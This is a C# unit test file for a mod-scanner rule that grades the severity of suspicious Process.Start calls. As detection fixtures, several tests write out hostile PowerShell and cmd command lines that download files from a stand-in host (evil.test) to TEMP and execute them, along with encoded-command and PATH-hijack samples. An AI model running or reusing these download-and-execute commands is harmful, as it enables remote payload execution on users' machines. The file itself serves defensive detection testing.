using FluentAssertions;
using MLVScan.Core.Tests.TestUtilities;
using MLVScan.Models;
using MLVScan.Models.Rules;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;
using InstructionCollection = Mono.Collections.Generic.Collection<Mono.Cecil.Cil.Instruction>;

namespace MLVScan.Core.Tests.Unit.Rules;

public class ProcessStartRuleTests
{
    private readonly ProcessStartRule _rule = new();
    private readonly System.Reflection.MethodInfo _determineSeverityMethod =
        typeof(ProcessStartRule).GetMethod("DetermineSeverity",
            System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)!;
    private readonly System.Reflection.MethodInfo _isSystemAssemblyMethod =
        typeof(ProcessStartRule).GetMethod("IsSystemAssembly",
            System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic)!;

    private (Severity? severity, string? reason) InvokeDetermineSeverity(
        string targetLower,
        string argumentsLower,
        bool useShellExecute = false,
        bool createNoWindow = false,
        bool windowStyleHidden = false,
        bool workingDirectoryIsTemp = false,
        bool hasUseShellExecuteIndicator = false,
        bool hasCreateNoWindowIndicator = false,
        bool hasWindowStyleIndicator = false,
        bool hasWorkingDirectoryIndicator = false,
        bool hasRedirectStandardInputIndicator = false,
        bool hasRedirectStandardOutputIndicator = false,
        bool hasRedirectStandardErrorIndicator = false,
        bool hasNetworkCallSignal = false,
        bool hasFileWriteSignal = false)
    {
        var result = _determineSeverityMethod.Invoke(_rule,
        [
            targetLower,
            argumentsLower,
            targetLower,
            argumentsLower,
            useShellExecute,
            createNoWindow,
            windowStyleHidden,
            workingDirectoryIsTemp,
            hasUseShellExecuteIndicator,
            hasCreateNoWindowIndicator,
            hasWindowStyleIndicator,
            hasWorkingDirectoryIndicator,
            hasRedirectStandardInputIndicator,
            hasRedirectStandardOutputIndicator,
            hasRedirectStandardErrorIndicator,
            hasNetworkCallSignal,
            hasFileWriteSignal
        ]);

        return ((Severity? severity, string? reason))result!;
    }

    private bool InvokeIsSystemAssembly(string assemblyName)
    {
        return (bool)_isSystemAssemblyMethod.Invoke(null, [assemblyName])!;
    }

    [Fact]
    public void RuleId_ReturnsProcessStartRule()
    {
        _rule.RuleId.Should().Be("ProcessStartRule");
    }

    [Fact]
    public void Severity_ReturnsCritical()
    {
        _rule.Severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void RequiresCompanionFinding_ReturnsFalse()
    {
        _rule.RequiresCompanionFinding.Should().BeFalse();
    }

    [Fact]
    public void DeveloperGuidance_IsProvided()
    {
        _rule.DeveloperGuidance.Should().NotBeNull();
        _rule.DeveloperGuidance!.IsRemediable.Should().BeTrue();
    }

    [Theory]
    [InlineData("System.Diagnostics.Process", "Start", true)]
    [InlineData("System.Diagnostics.ProcessStartInfo", "Start", true)] // ProcessStartInfo contains "Process"
    [InlineData("MyProcess", "Start", true)] // Contains "Process" and method is "Start"
    [InlineData("System.Diagnostics.Process", "Kill", false)]
    [InlineData("System.Diagnostics.Process", "WaitForExit", false)]
    [InlineData("System.IO.File", "Start", false)]
    public void IsSuspicious_VariousMethods_ReturnsExpected(string typeName, string methodName, bool expected)
    {
        var methodRef = MethodReferenceFactory.Create(typeName, methodName);

        var result = _rule.IsSuspicious(methodRef);

        result.Should().Be(expected);
    }

    [Fact]
    public void IsSuspicious_NullMethod_ReturnsFalse()
    {
        _rule.IsSuspicious(null!).Should().BeFalse();
    }

    [Fact]
    public void IsSuspicious_NullDeclaringType_ReturnsFalse()
    {
        var methodRef = MethodReferenceFactory.CreateWithNullType("Start");

        _rule.IsSuspicious(methodRef).Should().BeFalse();
    }

    [Theory]
    [InlineData("", false)]
    [InlineData("System.Net.Http", true)]
    [InlineData("Microsoft.Extensions.Logging", true)]
    [InlineData("System.Diagnostics.Process.dll", true)]
    [InlineData("Custom.System.Diagnostics.Process.dll", false)]
    public void IsSystemAssembly_VariousAssemblyNames_ReturnsExpected(string assemblyName, bool expected)
    {
        InvokeIsSystemAssembly(assemblyName).Should().Be(expected);
    }

    [Fact]
    public void AnalyzeContextualPattern_NullMethod_ReturnsEmpty()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        method.Body = new MethodBody(method);
        method.Body.GetILProcessor().Emit(OpCodes.Ret);

        var findings = _rule.AnalyzeContextualPattern(null!, method.Body.Instructions, 0, new MethodSignals()).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void AnalyzeContextualPattern_NonProcessStart_ReturnsEmpty()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        method.Body = new MethodBody(method);
        method.Body.GetILProcessor().Emit(OpCodes.Ret);

        var methodRef = MethodReferenceFactory.Create("System.IO.File", "OpenRead");
        var findings = _rule.AnalyzeContextualPattern(methodRef, method.Body.Instructions, 0, new MethodSignals()).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void AnalyzeContextualPattern_SystemAssemblyProcessStart_ReturnsEmpty()
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("System.Diagnostics.Process", new Version(1, 0, 0, 0)),
            "System.Diagnostics.Process",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var typeRef = new TypeReference("System.Diagnostics", "Process", module, module.Assembly.Name);
        var methodRef = new MethodReference("Start", module.TypeSystem.Void, typeRef);
        var method = new MethodDefinition("Caller", MethodAttributes.Public, module.TypeSystem.Void);
        method.Body = new MethodBody(method);
        method.Body.GetILProcessor().Emit(OpCodes.Call, methodRef);

        var findings = _rule.AnalyzeContextualPattern(methodRef, method.Body.Instructions, 0, new MethodSignals()).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void AnalyzeContextualPattern_CustomProcessStart_ReturnsFindingWithSnippetAndSignals()
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("MaliciousMod", new Version(1, 0, 0, 0)),
            "MaliciousMod",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Malicious", "Runner", TypeAttributes.Public | TypeAttributes.Class, module.TypeSystem.Object);
        module.Types.Add(type);
        var method = new MethodDefinition("Launch", MethodAttributes.Public, module.TypeSystem.Void);
        method.Body = new MethodBody(method);
        type.Methods.Add(method);

        var processType = new TypeReference("Custom.Diagnostics", "Process", module, module.Assembly.Name);
        var startRef = new MethodReference("Start", module.TypeSystem.Void, processType)
        {
            HasThis = false
        };
        startRef.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
        startRef.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));

        var processor = method.Body.GetILProcessor();
        processor.Emit(OpCodes.Ldstr, "cmd.exe");
        processor.Emit(OpCodes.Ldstr, "/c powershell -enc SQBFAFgA");
        processor.Emit(OpCodes.Call, startRef);

        var findings = _rule.AnalyzeContextualPattern(
            startRef,
            method.Body.Instructions,
            method.Body.Instructions.Count - 1,
            new MethodSignals { HasNetworkCall = true, HasFileWrite = true }).ToList();

        findings.Should().ContainSingle();
        findings[0].Location.Should().Contain("Custom.Diagnostics.Process.Start");
        findings[0].Description.Should().Contain("cmd.exe");
        findings[0].Description.Should().Contain("LOLBin");
        findings[0].CodeSnippet.Should().Contain(">>>");
    }

    [Fact]
    public void GetFindingDescription_WithStartInfoFileNameLiteral_IncludesTarget()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;
        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));

        string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);

        description.Should().Contain("Target: \"yt-dlp.exe\"");
    }

    [Fact]
    public void GetFindingDescription_WithDynamicStartInfoFileName_IncludesDynamicMarker()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldloc_0);
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;
        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));

        string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);

        description.Should().Contain("Target: <local V_0>");
    }

    [Fact]
    public void GetFindingDescription_WithPathCombineInSetFileName_ExtractsExecutableName()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "C:\\Tools");
        processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Combine", new TypeReference("", "String", null, null), new TypeReference("System.IO", "Path", null, null))
        {
            Parameters =
            {
                new ParameterDefinition(new TypeReference("", "String", null, null)),
                new ParameterDefinition(new TypeReference("", "String", null, null))
            }
        });
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;
        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));

        string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);

        description.Should().Contain("Target: \"yt-dlp.exe\"");
    }

    [Fact]
    public void GetFindingDescription_WithFieldBackedFileName_ExtractsExecutableName()
    {
        var type = new TypeDefinition("Tests", "Holder", TypeAttributes.Public | TypeAttributes.Class, new TypeReference("", "Object", null, null));
        var field = new FieldDefinition("ytDlpExePath", FieldAttributes.Public | FieldAttributes.Static, new TypeReference("", "String", null, null));
        type.Fields.Add(field);

        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static, new TypeReference("", "Void", null, null));
        type.Methods.Add(method);
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
        processor.Emit(OpCodes.Stsfld, field);
        processor.Emit(OpCodes.Ldsfld, field);
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;
        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));

        string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);

        description.Should().Contain("Target: \"yt-dlp.exe\"");
    }

    [Fact]
    public void GetFindingDescription_WithStartStringArguments_UsesFirstParameterAsTarget()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "yt-dlp.exe");
        processor.Emit(OpCodes.Ldstr, "--help");

        var startRef = new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null))
        {
            HasThis = false
        };
        startRef.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));
        startRef.Parameters.Add(new ParameterDefinition(new TypeReference("", "String", null, null)));
        processor.Emit(OpCodes.Call, startRef);

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;

        string description = _rule.GetFindingDescription(startRef, instructions, callIndex);

        description.Should().Contain("Target: \"yt-dlp.exe\"");
    }

    [Fact]
    public void GetFindingDescription_WithNonHiddenWindowStyleAndCreateNoWindowFalse_IncludesProcessStartInfoIndicators()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "cmd.exe");
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Ldc_I4_0);
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_CreateNoWindow", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Ldc_I4_0);
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_WindowStyle", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        int callIndex = instructions.Count - 1;
        var methodRef = new MethodReference("Start", new TypeReference("", "Boolean", null, null), new TypeReference("System.Diagnostics", "Process", null, null));

        string description = _rule.GetFindingDescription(methodRef, instructions, callIndex);

        description.Should().Contain("CreateNoWindow set");
        description.Should().Contain("WindowStyle set");
    }

    [Fact]
    public void DetermineSeverity_KnownSafeToolWithCreateNoWindowAndPlaceholderArgs_ReturnsMedium()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "yt-dlp.exe",
            argumentsLower: "<arg 0><arg 0>",
            createNoWindow: true,
            hasCreateNoWindowIndicator: true);

        result.severity.Should().Be(Severity.Medium);
        result.reason.Should().Contain("Known external tool");
    }

    [Fact]
    public void DetermineSeverity_WithWindowStyleIndicatorOnly_ReturnsHigh()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "<unknown/no-arguments>",
            hasWindowStyleIndicator: true);

        result.severity.Should().Be(Severity.High);
        result.reason.Should().Contain("ProcessStartInfo execution indicators");
    }

    [Fact]
    public void DetermineSeverity_WithCreateNoWindowIndicatorAndSuspiciousArgs_ReturnsCritical()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "-enc SQBFAFgA",
            hasCreateNoWindowIndicator: true);

        result.severity.Should().Be(Severity.Critical);
        result.reason.Should().Contain("ProcessStartInfo execution with suspicious arguments");
    }

    [Fact]
    public void DetermineSeverity_ControlledChildProcessWithRedirectedIo_ReturnsMedium()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "translator.exe",
            argumentsLower: "<arg 0>",
            createNoWindow: true,
            hasCreateNoWindowIndicator: true,
            hasRedirectStandardInputIndicator: true,
            hasRedirectStandardOutputIndicator: true,
            hasRedirectStandardErrorIndicator: true);

        result.severity.Should().Be(Severity.Medium);
        result.reason.Should().Contain("redirected I/O");
    }

    [Fact]
    public void DetermineSeverity_LolBinWithHiddenDownloadTempExecution_ReturnsCritical()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "powershell.exe",
            argumentsLower: "-ep bypass iwr https://evil.test -out $env:TEMP\\dl.bat",
            useShellExecute: true,
            createNoWindow: true,
            windowStyleHidden: true,
            workingDirectoryIsTemp: true,
            hasNetworkCallSignal: true,
            hasFileWriteSignal: true);

        result.severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void DetermineSeverity_NonLolBinWithSuspiciousDownloadArgs_ReturnsHigh()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "iwr https://evil.test/download.ps1");

        result.severity.Should().Be(Severity.High);
    }

    [Fact]
    public void DetermineSeverity_PowerShellStagedLoaderChain_ReturnsCriticalWithStagedLoaderReason()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "powershell.exe",
            argumentsLower: "-nop -w hidden iwr https://evil.test/payload -out $env:TEMP\\dl.bat; cmd /c $env:TEMP\\dl.bat",
            hasNetworkCallSignal: true,
            hasFileWriteSignal: true);

        result.severity.Should().Be(Severity.Critical);
        result.reason.Should().Contain("Staged loader chain");
    }

    [Fact]
    public void DetermineSeverity_SimpleProcessStart_RemainsGenericExecution()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "notepad.exe",
            argumentsLower: "<unknown/no-arguments>");

        result.severity.Should().Be(Severity.Medium);
        result.reason.Should().Be("External process execution");
    }

    [Theory]
    [InlineData("powershell.exe", "iwr https://evil.test/payload", null, null, Severity.Critical, "suspicious arguments")]
    [InlineData("cmd.exe", "%TEMP%\\payload.bat", null, null, Severity.Critical, "temp path")]
    [InlineData("cmd.exe", "<unknown/no-arguments>", null, null, Severity.High, "LOLBin execution")]
    [InlineData("random-tool.exe", "-enc SQBFAFgA", null, null, Severity.High, "suspicious arguments")]
    [InlineData("<dynamic target>", "--verbose", null, null, Severity.Medium, "Unknown target")]
    [InlineData("<unknown target>", "<unknown/no-arguments>", null, null, Severity.Medium, "Unknown process target")]
    public void DetermineSeverity_CommonUncoveredBranches_ReturnExpectedSeverity(
        string targetLower,
        string argumentsLower,
        bool? useShellExecute,
        bool? createNoWindow,
        Severity expectedSeverity,
        string expectedReason)
    {
        var result = InvokeDetermineSeverity(
            targetLower: targetLower,
            argumentsLower: argumentsLower,
            useShellExecute: useShellExecute == true,
            createNoWindow: createNoWindow == true);

        result.severity.Should().Be(expectedSeverity);
        result.reason.Should().Contain(expectedReason);
    }

    [Fact]
    public void DetermineSeverity_StrongEvasionWithSuspiciousArguments_ReturnsCritical()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "-enc SQBFAFgA",
            createNoWindow: true);

        result.severity.Should().Be(Severity.Critical);
        result.reason.Should().Contain("evasion and suspicious arguments");
    }

    [Fact]
    public void DetermineSeverity_KnownSafeToolWithSuspiciousContext_ReturnsMediumOrHighBranches()
    {
        InvokeDetermineSeverity(
                targetLower: "git.exe",
                argumentsLower: "https://example.test/repo %TEMP%\\repo",
                createNoWindow: true)
            .Should()
            .Be((Severity.High, "Known tool with suspicious download-and-execute chain"));

        InvokeDetermineSeverity(
                targetLower: "node.exe",
                argumentsLower: "-e \"iwr https://evil.test\"",
                createNoWindow: true)
            .severity
            .Should()
            .Be(Severity.High);

        InvokeDetermineSeverity(
                targetLower: "dotnet.exe",
                argumentsLower: "--info")
            .Should()
            .Be((Severity.Low, "Known external tool"));
    }

    [Fact]
    public void DetermineSeverity_StagedLoaderWithOnlyProcessStartInfoIndicator_ReturnsCritical()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "https://evil.test/drop.ps1 %TEMP%\\drop.ps1 && start %TEMP%\\drop.ps1",
            hasUseShellExecuteIndicator: true);

        result.severity.Should().Be(Severity.Critical);
        result.reason.Should().Contain("ProcessStartInfo execution indicators");
    }

    [Fact]
    public void DetermineSeverity_StagedLoaderWithoutEscalators_ReturnsHigh()
    {
        var result = InvokeDetermineSeverity(
            targetLower: "random-tool.exe",
            argumentsLower: "https://evil.test/drop.ps1 %TEMP%\\drop.ps1 && start %TEMP%\\drop.ps1");

        result.severity.Should().Be(Severity.High);
        result.reason.Should().Contain("Potential staged loader chain");
    }

    #region ShouldSuppressFinding Tests

    [Fact]
    public void ShouldSuppressFinding_BareExplorerExe_ReturnsTrue()
    {
        // Arrange: Build IL for bare "explorer.exe" call
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Ldstr, "C:\\Some\\Path");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_ExplorerExeWithPath_ReturnsFalse()
    {
        // Arrange: Build IL for "C:\\Windows\\explorer.exe" (should NOT suppress)
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "C:\\Windows\\explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ExplorerExeWithForwardSlash_ReturnsFalse()
    {
        // Arrange: Build IL for path with forward slash
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "C:/Windows/explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ExplorerExeWithPathCombine_ReturnsFalse()
    {
        // Arrange: Build IL for Path.Combine usage
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "SomeFolder");
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Combine", new TypeReference("", "String", null, null), new TypeReference("System.IO", "Path", null, null)));
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_CurrentProcessRestart_ReturnsTrue()
    {
        // Arrange: Build IL for restart pattern
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("get_MainModule", new TypeReference("", "ProcessModule", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("get_FileName", new TypeReference("", "String", null, null), new TypeReference("System.Diagnostics", "ProcessModule", null, null)));
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_ShellFolderLaunch_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldarg_0);
        processor.Emit(OpCodes.Call, new MethodReference("Exists", new TypeReference("", "Boolean", null, null), new TypeReference("System.IO", "Directory", null, null)));
        processor.Emit(OpCodes.Pop);
        processor.Emit(OpCodes.Ldarg_0);
        processor.Emit(OpCodes.Call, new MethodReference("CreateDirectory", new TypeReference("", "DirectoryInfo", null, null), new TypeReference("System.IO", "Directory", null, null)));
        processor.Emit(OpCodes.Pop);
        processor.Emit(OpCodes.Ldarg_0);
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_FileName", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Ldc_I4_1);
        processor.Emit(OpCodes.Callvirt, new MethodReference("set_UseShellExecute", new TypeReference("", "Void", null, null), new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null)));
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_ArbitraryExecutable_ReturnsFalse()
    {
        // Arrange: Build IL for arbitrary executable
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "malware.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_CmdExe_ReturnsFalse()
    {
        // Arrange: Build IL for cmd.exe
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "cmd.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_RestartWithStringManipulation_ReturnsFalse()
    {
        // Arrange: Build IL with restart pattern but then string manipulation
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("get_MainModule", new TypeReference("", "ProcessModule", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));
        processor.Emit(OpCodes.Callvirt, new MethodReference("get_FileName", new TypeReference("", "String", null, null), new TypeReference("System.Diagnostics", "ProcessModule", null, null)));
        processor.Emit(OpCodes.Ldstr, " --arg");
        processor.Emit(OpCodes.Call, new MethodReference("Concat", new TypeReference("", "String", null, null), new TypeReference("System", "String", null, null)));
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_ExplorerExeCaseInsensitive_ReturnsTrue()
    {
        // Arrange: Build IL with mixed case "Explorer.EXE"
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "Explorer.EXE");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, new MethodSignals());

        // Assert
        result.Should().BeTrue();
    }

    #endregion

    #region Security Tests - PATH Manipulation Attack

    /// <summary>
    /// SECURITY TEST: PATH manipulation attack vector
    /// If attacker modifies PATH to point to malicious explorer.exe, 
    /// Process.Start("explorer.exe") should NOT be suppressed.
    /// </summary>

    [Fact]
    public void ShouldSuppressFinding_WithEnvironmentVariableModification_ReturnsFalse()
    {
        // Arrange: Build IL that modifies PATH then calls explorer.exe
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        // Simulate: Environment.SetEnvironmentVariable("PATH", maliciousPath + ";" + currentPath)
        processor.Emit(OpCodes.Ldstr, "PATH");
        processor.Emit(OpCodes.Ldstr, "C:\\Malicious;C:\\Windows");
        processor.Emit(OpCodes.Call, new MethodReference("SetEnvironmentVariable", new TypeReference("", "Void", null, null), new TypeReference("System", "Environment", null, null)));

        // Now call explorer.exe (which would resolve to malicious version)
        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // Create MethodSignals with environment modification flag set
